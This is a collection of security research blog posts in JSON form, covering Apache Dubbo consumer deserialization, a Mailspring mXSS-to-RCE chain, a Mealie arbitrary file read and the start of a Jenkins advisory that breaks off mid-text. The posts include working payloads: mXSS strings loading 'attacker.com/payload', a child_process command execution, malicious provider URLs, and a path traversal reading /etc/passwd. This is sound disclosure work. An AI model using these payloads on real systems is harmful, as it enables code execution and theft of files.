[{"title":"Apache Dubbo Consumer Risks: The Road Not Taken","url":"/2024/03/31/Apache Dubbo Consumer Risks: The Road Not Taken/","content":"# Introduction\nApache Dubbo is a popular Java open-source, high-performance RPC (Remote Procedure Call) framework designed to simplify the development of microservices-based and distributed systems. Originally created by Alibaba, Dubbo has gained widespread popularity and is now maintained as a top-level Apache project with 40K stars on GitHub. At its core, Dubbo provides a robust communication protocol that allows services to seamlessly exchange data and invoke methods across different networked nodes, enabling the creation of scalable, flexible, and reliable applications. With its rich ecosystem and community support, Apache Dubbo has become a go-to choice for organizations seeking to harness the power of distributed computing in their software solutions.\n\nIn the past, several publications covered vulnerabilities in the framework, mainly affecting the provider end of the RPC layout, such as [The 0xDABB of Doom](https://checkmarx.com/blog/the-0xdabb-of-doom-cve-2021-25641/). In 2021, [Alvaro Muñoz](https://github.com/pwntester) published great research on the framework with an article named \"[Apache Dubbo: All roads lead to RCE](https://securitylab.github.com/research/apache-dubbo/)\", disclosing more than a dozen RCE vulnerabilities.\n\nInterestingly, Muñoz unveiled and discussed a bit on vulnerabilities affecting the consumer end rather than the provider (we will explain Dubbo’s architecture in the next section). The curiosity about this less researched side of Dubbo led us to unveil two other interesting findings that later were debatably not considered vulnerabilities by Apache. Nevertheless, we publish our research out of technical interest so that the community is aware of the risks. Following our disclosure, Apache [updated](https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323) its documentation to provide clearer safety instructions for users.\n\n# Key Information\n* Sonar’s Vulnerability Research Team has discovered two security issues in Apache Dubbo.\n* After reporting and discussing the findings, the Apache team didn’t classify them as vulnerabilities.\n* Despite having similar issues being recognized as vulnerabilities in the past, the Apache team claimed that it is the user’s responsibility to make sure that registries are well protected as they should provide a shield against untrusted Providers.\n* Following our notes on the unclarity of this point of view in their documentation, Apache [updated](https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323) its [documentation](https://dubbo.apache.org/en/overview/notices/registry/) for users to protect themselves better. \n\n# Impact\nApache Dubbo consumers who invoke RPC functions on untrusted provides or using non-secure registries are susceptible to arbitrary object deserialization, which can eventually result in remote code execution (RCE).\n\n<iframe width=\"736\" height=\"414\" src=\"https://www.youtube.com/embed/skaky-lI8a8\" title=\"Apache Dubbo Consumer Risks: The Road Not Taken\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen></iframe>\n\n# Apache Dubbo Technical Details\nIn this section, we will showcase the technical details and explanation of our findings. We will discuss the common Dubbo architecture and how this attack vector works.\n\n## Background\n\nApache Dubbo provides an RPC framework based on Java with three main components in the architecture:\n\n* Provider - the “server” that exposes functions for execution.\n* Consumer - the “client” that invokes predefined functions on the provider.\n* Registry - Holds information for and from both consumers and providers (for example, when a consumer wants to invoke a function, they get the provider metadata, address, and more from the registry).\n\n<img src=\"/img/blogs/apache-dubbo/image1.png\" style=\"width: 100%;\"/>\n\nThe basic code for a consumer is quite straightforward. At first, we set up a Dubbo reference service and name our application:\n\n```java\nReferenceConfig<GreetingsService> reference = new ReferenceConfig<>();\nreference.setApplication(new ApplicationConfig(\"first-dubbo-client\"));\n```\n\nAfter this, the reference is configured to a specific registry by calling `setRegistry`. This is a crucial step, as we will see later:\n\n```java\nreference.setRegistry(new RegistryConfig(\"multicast://224.5.6.7:1234\"));\n```\n\nNext, our desired interface will be set, which will result in Dubbo providing the relevant server that implements a corresponding function. At last, we can invoke a function on the provider and access the results:\n\n```java\nreference.setInterface(GreetingsService.class);\nGreetingsService greetingsService = reference.get();\nString message = greetingsService.sayHi(\"dubbo\");\nSystem.out.println(message);\n```\n\nIn the past, there were multiple vulnerabilities, mainly affecting the providers. But as demonstrated [before](https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/) by [Alvaro Muñoz](https://github.com/pwntester) (CVE-2021-30181, CVE-2021-30180, GHSL-2021-040, GHSL-2021-041, and GHSL-2021-042), vulnerabilities in consumers happened by poisoning the registry: “Zookeeper supports authentication but it is disabled by default and in most installations, and other systems such as Nacos do not even support authentication”\n\nWhile previous attacks on consumers were by controlling configurations via the registry, this attack focuses on the *response*’s deserialization. A specifically crafted response on an invocation request might execute arbitrary code on the consumer. \n\nAn attacker can manipulate a consumer to invoke a function on a malicious provider in multiple ways such as:\n\n1. Creating a new malicious provider in the registry.\n2. Changing an existing provider address in the registry to an attacker-controlled one.\n3. Having previous control over a provider (lateral movement).\n4. Social engineering.\n\nAs discussed before, since registries don’t have authentication by default (some don’t support it at all), it is important to emphasize to users that this attacker scenario is feasible. As a result of our report, Apache clarified in the [documentation](https://dubbo.apache.org/en/overview/notices/registry/) its threat model, claiming that everything from the registry is considered trusted, users should enable authentication in their registries, and avoid exposing them to the public.\n\nThe code in the consumer that invokes a function on a provider will first check the supported provider’s serialization via the registry. Later, it will send the data (such as function parameters) serialized using the supported methods. Some serialization methods are considered safe (fastjson2, hessian2, …) and others are not (native-java, kyro, …). On the provider’s end, a check is made to see if the request’s data serialization is supported using a flag called `SERIALIZATION_SECURITY_CHECK_KEY`, which is `true` by [default](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L84). \n\nThis prevents an attacker from using arbitrary serialization methods (a vulnerability found previously by [Dor Tumarkin](https://checkmarx.com/blog/the-0xdabb-of-doom-cve-2021-25641/) and [Alvaro Munoz](https://securitylab.github.com/research/apache-dubbo/) independently tracked as CVE-2021-25641).\n\n## Finding 1 - Arbitrary Object Deserialization via the Dubbo protocol\nDespite having the same `SERIALIZATION_SECURITY_CHECK_KEY` flag on the consumer’s end, all it's doing is [checking](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcResult.java#L141) that the response’s serialization type is the same as the one sent. Since this attack vector relies on an attacker-controlled provider, the supported serialization of the provider can also be modified to an unsafe one, causing the response deserialization to be unsafe.\n\nA malicious provider can be registered with the `prefer.serialization=nativejava` parameter in the URL (in addition to `decode.in.io.thread=true` and corresponding to the registered consumer’s interface, version, etc. To ensure the desired function registration). This forces the consumer to use `nativejava` serialization when sending data to the provider, automatically allowing deserializing the response with the unsafe `nativejava` deserialization wrapper.\n\nLet’s assume the following registration example:\n\n```python\n'dubbo://192.168.1.20:20881/org.apache.dubbo.samples.api.GreetingsService?prefer.serialization=nativejava,fastjson2,hessian2&decode.in.io.thread=true&application=demo-provider&scopeModel=test&deprecated=false&dubbo=2.0.2&dynamic=true&generic=false&interface=org.apache.dubbo.samples.api.GreetingsService&methods=sayHi,sayHu&release=3.2.4&service-name-mapping=true&side=provider&timestamp=' + str(int(time.time()*1000)).encode(\"utf-8\")\n```\n\nAccording to the Dubbo protocol, the malicious provider response header should look like this:\n\n<img src=\"/img/blogs/apache-dubbo/image3.png\" style=\"width: 100%;\"/>\n\n* Dubbo protocol header `\\xda\\xbb`\n* Deserialization id `\\x07` (7 - for nativejava), \n* Response code `\\x14` (20 for successful invocation) \n* The following 8 bytes are the “future id” which are taken from the request. \n* Serialized object length\n* Serialized object\n\nThis header will result in the payload ending up in the vulnerable `decode` [function call](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L128). Since Dubbo first [reads](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcResult.java#L96) a byte flag from the object and then deserializes accordingly, an attacker would need to start the object with a serialized byte (adding `\\x77\\x01\\x01` for flag 1, meaning no exception and an object without attachments).\n\nUsing a deserialization gadget payload (for demonstration purposes, generated via [ysoserial](https://github.com/frohoff/ysoserial)), a consumer that invokes a function on a malicious provider is susceptible to arbitrary code execution:\n\n<img src=\"/img/blogs/apache-dubbo/image5.png\" style=\"width: 100%;\"/>\n\n## Finding 2 - Arbitrary Object Deserialization via Triple/gRPC protocol\nFollowing the same attack surface as before, an attacker can register a provider using a different protocol than `dubbo://`. Consumers support the following protocols out of the box and don’t require any special changes to the code.\n\n* *registry*: `org.apache.dubbo.registry.integration.InterfaceCompatibleRegistryProtocol`\n* *rest*: `org.apache.dubbo.rpc.protocol.rest.RestProtocol`\n* *injvm*: `org.apache.dubbo.rpc.protocol.injvm.InjvmProtocol`\n* *service-discovery-registry*: `org.apache.dubbo.registry.integration.RegistryProtocol`\n* *mock*: `org.apache.dubbo.rpc.support.MockProtocol`\n* *dubbo*: `org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol`\n* *tri*: `org.apache.dubbo.rpc.protocol.tri.TripleProtocol`\n* *grpc*: `org.apache.dubbo.rpc.protocol.tri.GrpcProtocol`\n\nAccording to the provider’s protocol registered in the registry, the consumer will use different data decoders/encoders. The `tri` and `grpc` protocols are susceptible to Arbitrary Object Deserialization when receiving a response, in a similar fashion to the first finding. Both protocols underline using HTTP2 and gRPC.\n\nIn the following example, a malicious provider is registered with the `prefer.serialization=nativejava` parameter in the URL but with the `tri://` or `grpc://` protocol (unlike `dubbo://` scheme used by default in the first finding):\n\n```python\n'tri://192.168.1.20:20881/org.apache.dubbo.samples.api.GreetingsService?prefer.serialization=nativejava,fastjson2,hessian2&release=3.2.4&application=demo-provider&scopeModel=test&deprecated=false&dubbo=2.0.2&dynamic=true&generic=false&interface=org.apache.dubbo.samples.api.GreetingsService&methods=sayHi,sayHu&service-name-mapping=true&side=provider&decode.in.io.thread=true&timestamp=' + str(int(time.time()*1000)).encode(\"utf-8\")\n```\n\nThe data received from the provider is decoded [here](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/stream/TripleClientStream.java#L464) (more specifically, the data frame). According to the [deliver](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/frame/TriDecoder.java#L70) function and the [parseFrom](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/TripleCustomerProtocolWapper.java#L101) this is the data structure:\n\n<img src=\"/img/blogs/apache-dubbo/image4.png\" style=\"width: 100%;\"/>\n\n* Header byte (`\\x00`)\n* Length of following data, \n* Serialization type byte (`\\x0a`)\n* Serialization type text length byte\n* Serialization type text (`nativejava`)\n* Object byte (`\\x12`)\n* Object length, calculated via protobuf’s [RawVarint32](https://github.com/protocolbuffers/protobuf/blob/5c8cbdfefdb482c4be16c9b9f014943db72e0ce1/java/core/src/main/java/com/google/protobuf/CodedInputStream.java#L530)\n* Object payload\n\nThe vulnerable function [unpack](https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/ReflectionPackableMethod.java#L360)s and deserializes any data received from the provider if the deserialization type is included in the `prefer.serialization` parameter, which is controlled by the attacker.\n\nSimilarly to the first demonstration, a gadget payload generated via [ysoserial](https://github.com/frohoff/ysoserial) would leverage the arbitrary object deserialization to execute arbitrary code on the consumer when invoking a function on a malicious provider.\n\n<img src=\"/img/blogs/apache-dubbo/image2.png\" style=\"width: 100%;\"/>\n\n# Apache Response\nAfter reporting our findings to Apache, they claimed that the risk of malicious providers or infiltration using an unprotected registry is introduced by the user. Following our communication explaining that this threat model was unclear to us and likely to users of the framework, Apache [updated](https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323) its documentation accordingly.\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-08-28 | We report all issues to the vendor. |\n| 2023-09-29 | Vendor disputed the report claiming this attack is not considered in their threat model. |\n| 2023-12-15 | After back-and-forth communication, the vendor agreed that their point of view was not conveyed through the documentation and [updated](https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323) it accordingly. |\n\n# Summary\nThis blog covered a different way of introducing security risks into an Apache Dubbo infrastructure. Despite it being disputed by the vendor, we are confident that our research helps contribute to the documentation and, alongside this publication, makes users aware of those risks.  \n\nThis example showcased misinterpretation due to confusing flag verification. Additionally, it highlighted the absence of a well-defined threat model, which can bewilder users. At Sonar, we stress the significance of Clean Code as it enhances code readability, maintainability, and security. Clean Code promotes clear and concise code structures, making it easier for developers to identify potential vulnerabilities and implement appropriate security measures. By adhering to Clean Code principles, organizations can minimize the risk of security breaches and ensure the integrity of their software applications.","tags":["deserialization","java","apache","rpc","rce","disputed"]},{"title":"Reply to calc: The Attack Chain to Compromise Mailspring","url":"/2024/03/10/Reply to calc: The Attack Chain to Compromise Mailspring/","content":"# Introduction\nMailspring, formerly known as [nylas-mail](https://github.com/nylas/nylas-mail), is a popular email client application that gives users a fast and efficient way to manage their email accounts. It is a free and open-source program for Windows, Mac, and Linux operating systems. Mailspring comes with a variety of advanced features, such as snoozing emails, scheduling messages, email tracking, and more. It also supports a wide range of email services, including Gmail, Yahoo, Outlook, and more. With its user-friendly interface and powerful functionality, Mailspring has become a popular choice for those looking for a reliable and versatile email client.\n\nContinuing our effort to improve open-source security and enhance our Clean Code technology, we decided to research and evaluate the security of the Mailspring desktop application. Considering its popularity, security issues in the application have a high impact potential. In this blog, we will present our research and findings. \n\n# Impact\nMailspring versions before 1.11.0 are susceptible to several vulnerabilities, enabling an attacker to execute arbitrary code when a victim tries to reply to or forward a malicious email.\n\n<iframe width=\"736\" height=\"414\" src=\"https://www.youtube.com/embed/rbeHR2Tq3dM\" title=\"Reply to Calc: the Attack Chain to Compromise Mailspring\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen></iframe>\n\nMailspring version 1.11.0 employs mitigations to prevent exploitation. However, the underlying vulnerability has not been fixed as of today.\n\n# Technical Details - CVE-2023-47479 \nIn the following section, we will explain the technical details of the vulnerabilities, which are tracked as CVE-2023-47479. We will describe how an attacker can bypass some mitigations to ultimately achieve code execution when a user replies to or forwards a malicious email. \n\n## mXSS Background\nMutation Cross-Site Scripting (mXSS) is a sophisticated variation of the well-known Cross-Site Scripting (XSS) vulnerability. When an application needs to safely render the user’s input as HTML, to support some HTML features, sanitization would be the solution. Allowing specific tags and attributes while stripping or encoding others. Unfortunately, this is not a straightforward task since HTML is a syntax-tolerant language that may change or “mutate” when parsing. mXSS takes advantage of that by providing a payload that seems innocent initially when parsing (during the sanitization process) but mutates it to a malicious one when re-parsing it (in the final stage of displaying the content).\n\n## mXSS in the Email Renderer\nBefore rendering and showing an email to the user, Mailspring sanitizes the content with a [built-in sanitizer](https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L527). The sanitizer uses `DOMParser` and, according to a predefined list, will accept, remove, or replace tags and content. Problems occur when the sanitizer changes a disallowed tag after the parsing is done, causing the resulting content to be parsed differently.\n\nFor example, we will use the following email content:\n<img src=\"/img/blogs/mailspring/image11.png\" style=\"width: 100%;\"/>\n\nParsing the given string to a DOM tree will result in an `a` tag inside the `style` as expected within “[foreign content](https://html.spec.whatwg.org/#parsing-main-inforeign)”, this is because `style` is handled differently in [SVG](https://infra.spec.whatwg.org/#svg-namespace)/[MathML](https://infra.spec.whatwg.org/#mathml-namespace) namespaces:\n\n<img src=\"/img/blogs/mailspring/image9.png\" style=\"width: 100%;\"/>\n\nMailspring doesn’t allow `svg` tags and will [replace](https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L478) them with `span` tags during the sanitization. We covered the risk of “Desanitization” (the act of changing and interfering with the sanitizer’s output) in previous blogs where we encountered other vulnerabilities that follow this dangerous behavior: \n\n* [Pitfalls of Desanitization: Leaking Customer Data from osTicket](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/)\n* [Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/)\n* [Code Vulnerabilities Put Skiff Emails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/)\n* And more\n\nBecause Mailspring continues iterating over the manipulated sanitizer’s output using the same parsed DOM tree, it would still seem as if there were a foreign content tag (`svg` and not `span`):\n\n<img src=\"/img/blogs/mailspring/image10.png\" style=\"width: 100%;\"/>\n\nThis is why the sanitizer can’t see the malicious tag, but later, when embedding the result in the page, the `style` tag won't be inside a “[foreign content](https://html.spec.whatwg.org/#parsing-main-inforeign)” and thus closes where the `title` attribute used to be:\n\n<img src=\"/img/blogs/mailspring/image5.png\" style=\"width: 100%;\"/>\n\nWe can see our injected tag in the rendered content. But it is inside a sandboxed iframe, stopping it from executing any JavaScript code.\n\n<img src=\"/img/blogs/mailspring/image15.png\" style=\"width: 100%;\"/>\n\n## Bypassing the mitigations\n### Sandboxed Iframe\nThere is not much an attacker can do inside a sandboxed iframe, but we noticed that when a user replies to or forwards an email, the content of it will be rendered again outside of the sandboxed iframe.\n\n<img src=\"/img/blogs/mailspring/image14.png\" style=\"width: 50%;\"/>\n\nHowever, the injected JavaScript code will still not run because of a Content Security Policy in the main window:\n\n<img src=\"/img/blogs/mailspring/image12.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/mailspring/image13.png\" style=\"width: 100%;\"/>\n\n### Content Security Policy Bypass \nWhen evaluating this policy, we noticed that there is a misconfiguration:\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * mailspring:; script-src 'self' chrome-extension://react-developer-tools; style-src * 'unsafe-inline' mailspring:; img-src * data: mailspring: file:;\">\n```\n\nBecause `default-src` is set to `*` and there's no `object-src` override, an attacker can execute code with an `object` tag. This is limited to JavaScript files served via the `http`, `https`, `ws`, and `wss` protocols by default.\n\nIn addition to that, `script-src 'self'` allows using a `script` tag with a local file as a `src` to execute JavaScript code. This works because Electron, the underlying technology behind Mailspring,  serves the UI via the `file://` protocol. To abuse this, an attacker must control a file on the victim’s computer and point to it via a script’s `src` attribute.\n\nHowever, when sending a new payload that uses a malicious `object` tag to bypass the CSP, replying to/forwarding it, would mysteriously remove our tag. This did not happen for the initial payload with the `img` tag, so what is going on here?\n\n```html\n<svg><style><a title=\"</style><object data='https://attacker.com/payload'>\">\n```\n\nEmail body:\n\n<img src=\"/img/blogs/mailspring/image2.png\" style=\"width: 100%;\"/>\n\nReply-to/forward content:\n\n<img src=\"/img/blogs/mailspring/image4.png\" style=\"width: 100%;\"/>\n\nThere must be another sanitization when replying to or forwarding an email.\n\n<img src=\"/img/blogs/mailspring/image1.png\" style=\"width: 100%;\"/>\n\n### reply-to/forward sanitization bypass\nDrilling down to the component that handles the reply/forward window, we came across [inflates-draft-client-id.jsx](https://github.com/Foundry376/Mailspring/blob/1.10.8/app/src/decorators/inflates-draft-client-id.tsx#L77). The `draft` content still contains our `object` tag at this point but will later be removed, so this content is before the 2nd sanitization. \n\n<img src=\"/img/blogs/mailspring/image8.png\" style=\"width: 100%;\"/>\n\nLooking at this HTML draft snippet, we understand that Mailspring adds content to the window, such as the user’s mail signature, custom CSS, timestamp, etc. The `signature` tag at the start of the draft caught our attention. Since it's a custom tag and appended before the replied/forwarded malicious email content, maybe the sanitization there is different? \n\nIndeed, embedding the malicious input in a `signature` tag avoided the 2nd sanitization. As a result, this payload allows the execution of arbitrary JavaScript code:\n\n```html\n<svg><style><a title=\"</style><signature><object data='https://attacker.com/payload'></object></signature>\">\n```\n\n<img src=\"/img/blogs/mailspring/image7.png\" style=\"width: 100%;\"/>\n\n## From XSS to RCE\nThe [main](https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/browser/mailspring-window.ts#L100) window of Mailspring uses `nodeIntegration: true` and `contextIsolation: false`, meaning any JavaScript code that runs in this context can also access the internal NodeJS objects and thus execute arbitrary code on the machine. Because the payload until this point has been executed in the origin of `attacker.com`, which blocks the attacker from accessing the main parent window due to the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), an attacker would need to find a way to escalate the impact from XSS to RCE. \n\nFrom here, we came up with two different vectors:\n\n### Outdated Electron V8 Vulnerability\nMailspring runs on an outdated electron, thus a chromium version that is susceptible to [CVE-2022-1364](https://nvd.nist.gov/vuln/detail/CVE-2022-1364), and potentially other 1days (running `window.navigator.userAgent` on the dev tools gives the following value):\n\n```\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Mailspring/1.10.8 Chrome/98.0.4758.141 Electron/17.4.0 Safari/537.36\n```\n\nAn attacker can use known exploits to gain full command execution regardless of Electron’s origin isolation.\n\n### CSS Exfiltration\nThe XSS shown above is executed from an external website origin, stopping the JavaScript from accessing the `top` window due to the [Same-origin-policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). For a window to be able to access its parent, both should be same-origin. Since Mailspring runs on the `file://` scheme, any framed window (`object`, `iframe`, `embed`, etc.) that is also from the `file://` scheme can access the main window (and then node internals).\n\nFor that, an attacker needs to have control over a file on the machine; this can be achieved with attachment files. After sending an email with an attachment, we saw that the files are moved to a randomly [generated directory](https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/flux/stores/attachment-store.ts#L67) under `…/Mailspring/files/<random-id>.substr(0, 2)/<random>.substr(2, 2)/<random-id>/attachment_file`. This path is not reflected in the DOM and cannot be guessed.\n\nBut sending an [inline image](https://stackoverflow.com/questions/6706891/embedding-image-in-html-email) (with CID) will cause the path to be reflected in the DOM. Using that, an attacker can use known [CSS exfiltration techniques](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection), given that CSS is allowed by Mailspring’s sanitizer, to extract the random path of the controlled file. Then use the same XSS as before but point the `object`’s `data` tag to the controlled file. Since it's the same origin as the main window, accessing `parent` and running arbitrary node commands is possible.\n<img src=\"/img/blogs/mailspring/image3.png\" style=\"width: 100%;\"/>\n\nThe POC:\n\n1. Attacker sets up a CSS exfiltration server.\n2. Attacker sends an email with the CSS exfiltration payload and an inline “image” which is actually the following malicious HTML page: `<script>top.require('child_process').execSync('open -a Calculator')</script>`\n3. When the victim views the email, the payload “image” path is extracted.\n4. Attacker sends a second email with the mXSS payload pointing to the extracted path: `<svg><style><a title=\"</style><signature><object data='**extracte_path**'></object></signature>\"></style>`\n5. When a victim tries to reply or forward the message, a calculator will show up.\n\n<img src=\"/img/blogs/mailspring/image6.png\" style=\"width: 100%;\"/>\n\n# Patch\n\nWe tried contacting the maintainers in various ways, but due to unresponsiveness, the only implemented [fix](https://github.com/Foundry376/Mailspring/commit/5126294f589d94231ea8ec31a94847ccdf6f4dcb) was hardening the CSP.\n\n```diff\n+ object-src none; media-src mailspring:; manifest-src none;\n```\n\nDespite the lack of proper attention and fix, there are several takeaways developers can take from these findings:\n* Avoid interfering with data after the sanitization ([Desanitization](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/)).\n* Follow the [official Electron Security documentation](https://www.electronjs.org/docs/latest/tutorial/security) which covers [node integration](https://www.electronjs.org/docs/latest/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content), [context isolation](https://www.electronjs.org/docs/latest/tutorial/security#3-enable-context-isolation), [file protocol](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), and more.\n* Ensure your mitigation steps, such as [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), are configured correctly.\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-04-27 | We report all issues to the vendor, including our disclosure policy |\n| 2023-05-11 | We Ping the vendor |\n| 2023-05-23 | We Ping the vendor using a personal email address |\n| 2023-06-26 | We open a discrete issue on GitHub |\n| 2023-07-04 | The vendor acknowledges the report |\n| 2023-07-29 | The CSP policy is hardened |\n| 2023-08-09 | We ping the vendor, offering help with the fixes |\n| 2023-09-05 | We ping the vendor again with no success |\n| 2024-03-09 | We notify the vendor about the release of this blog |\n\n# Summary\n\nIn this blog, we covered a vulnerability chain that attackers might exploit to achieve RCE on a victim’s computer simply by manipulating them to click “reply-to” or “forward” from a malicious email. We explained the importance of avoiding the dangerous [Desanitization](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/) pattern and outlined the significance of a strong CSP.\n\nTo help you implement these critical aspects in your own code, Sonar provides a vast range of security rules, such as [S5728](https://sonarsource.github.io/rspec/#/rspec/S5728), which ensures that a default-src CSP directive is set. This reduces the impact of XSS vulnerabilities and follows the Clean Code principle, which emphasizes the creation of clear and maintainable software. This not only facilitates the detection and resolution of vulnerabilities throughout the development process but also reduces the risk of introducing security weaknesses that malicious actors could exploit.","tags":["rce","mxss","electron","csp","sop","sandbox"]},{"title":"Authenticated Arbitrary File Read in Mealie","url":"/2024/01/31/Authenticated Arbitrary File Read in Mealie/","content":"# Description\nMealie before version 1.0.0 is vulnerable to authenticated arbitrary file read due to improper validation of the path in the `/api/recipes/bulk-actions/export/download` and `/api/utils/download` endpoints.\n\n# Explotation\n1. Fetch a valid JWT token from the URL:\n`http://Mealie-domain/api/recipes/bulk-actions/export/download?p\nath=%2Fetc%2Fpasswd`\n2. Download the file using the JWT token provided:\n`http://Mealie-domain/api/utils/download?token=<TOKEN>`\n\n# Impact\nAny authenticated user can generate an API token and thus access the API. Using this\nvulnerability, an authenticated attacker can read arbitrary files from the server leading to\ndifferent impacts from confidentiality to RCE via secrets/keys exfiltration.\n\n# Mitigation\nUpgrade Mealie to version `1.0.0` or later\n\n# References\n* [Pull request](https://github.com/mealie-recipes/mealie/pull/2867)","tags":["arbitrary file read"]},{"title":"Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins","url":"/2024/01/23/Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins/","content":"# Key Information\n* Sonar’s Vulnerability Research Team has discovered security vulnerabilities in Jenkins, the leading open-source Continuous Integration and Continuous Deployment (CI/CD) software.\n* The discovered Critical vulnerability tracked as CVE-2024-23897 allows unauthenticated attackers to read a limited amount of arbitrary files’ data, and \"read-only\" authorized attackers to an entire arbitrary file from Jenkins’ server.\n* Attackers could leverage this vulnerability, by reading Jenkins secrets, to escalate privileges to admin and eventually execute arbitrary code on the server.\n* The discovered High severity, cross-site WebSocket hijacking (CSWSH), vulnerability tracked as CVE-2024-23898, allows an attacker to execute arbitrary CLI commands by manipulating a victim to click on a link.\n* The vulnerabilities were fixed in Jenkins versions 2.442, and LTS 2.426.3.\n\nJenkins is the leading open-source automation server widely used for building, deploying, and automating software projects. Originally developed as Hudson, Jenkins has evolved into a powerful tool for continuous integration and continuous delivery (CI/CD). It enables developers to automate various aspects of the software development lifecycle, including building, testing, and deploying applications. With a market share of approximately [44% in 2023](https://cd.foundation/announcement/2023/08/29/jenkins-project-growth/), the popularity of Jenkins is evident. This means the potential impact of security vulnerabilities in Jenkins is large.\n\n# Vulnerabilities Impact\nUnauthenticated attackers can read the first few lines of arbitrary files from the server, while read-only authorized attackers can read the entire file. This could ultimately lead to the execution of arbitrary code in some cases (CVE-2024-23897). If one of the following conditions is met, even unauthenticated users have at least read permission:\n* Legacy mode authorization is enabled.\n* Configuration “Allow anonymous read access” is checked in the “logged-in users can do anything” authorization mode.\n* The signup feature is enabled.\n\nThe second vulnerability (CVE-2024-23898) resides within the WebSocket CLI feature, which lacks an origin check, allowing Cross-Site WebSocket Hijacking (CSWSH). This vulnerability might be exploited by sending a malicious link to a victim. Certain modern web browsers implement a “[lax by default](https://caniuse.com/mdn-http_headers_set-cookie_samesite_lax_default)” policy, which serves as a potential safeguard against this vulnerability. Nonetheless, given that some widely used browsers like Safari and Firefox do not strictly enforce this policy, and considering the associated risks of potential [bypass](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies) techniques or users using outdated browsers, the severity classification for this vulnerability is High.\n<iframe width=\"736\" height=\"414\" src=\"https://www.youtube.com/embed/ucs-XF5X3bE\" title=\"Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section of the blog, we will explore our findings taking a deeper dive into the code, to understand the vulnerabilities and how an attacker could exploit them. During the Jenkins security team’s triaging of our report, they found further ways to exploit the first vulnerability (CVE-2024-23897) using an unauthenticated user. The following \"Technical Details\" covers the attack scenario of a read-only capable attacker. \n\n# Background\nJenkins provides multiple ways of authorization, the unsafe *“anyone can do anything”*, the *“legacy”* permissions, and *“logged-in users can do anything”*. The latter authorization method allows the option for anonymous read access and gives read permission to anyone, which is also the case in the *legacy* mode.\n\n<img src=\"/img/blogs/jenkins/image_1.webp\" style=\"width: 100%;\"/>\n\nOn top of that, there is also the not recommended option to *“Allow users to sign up”*, which makes everyone at least read-only capable.\n\nAccording to the [official 